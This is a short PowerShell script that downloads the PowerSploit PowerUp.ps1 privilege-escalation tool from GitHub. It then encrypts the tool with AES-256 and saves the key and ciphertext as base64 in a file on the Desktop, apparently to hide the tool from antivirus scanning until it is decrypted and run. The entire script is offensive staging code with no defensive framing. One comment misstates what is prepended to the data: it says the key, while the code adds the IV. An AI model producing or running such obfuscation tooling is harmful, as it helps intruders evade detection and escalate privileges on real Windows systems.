#download source script file
$unencryptedString = (New-Object Net.WebClient).downloadstring('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Privesc/PowerUp.ps1 ');

#encrypt
$aes = New-Object "System.Security.Cryptography.AesManaged";
$aes.Mode = [System.Security.Cryptography.CipherMode]::CBC;
$aes.Padding = [System.Security.Cryptography.PaddingMode]::Zeros;
$aes.BlockSize = 128;
$aes.KeySize = 256;
$aes.GenerateKey();
$key=[System.Convert]::ToBase64String($aes.Key);
$key;
$bytes = [System.Text.Encoding]::UTF8.GetBytes($unencryptedString);
$encryptor = $aes.CreateEncryptor();
$encryptedData = $encryptor.TransformFinalBlock($bytes, 0, $bytes.Length);

#add the 256bit AES key of 44 characters(base64) at the start of the file 
[byte[]] $fullData = $aes.IV + $encryptedData;
$aes.Dispose();

#convert to base64
$encryptedString = [System.Convert]::ToBase64String($fullData);

#save the file on the Desktop
[System.IO.File]::WriteAllText("$env:userprofile\desktop\file",$key+$encryptedString)
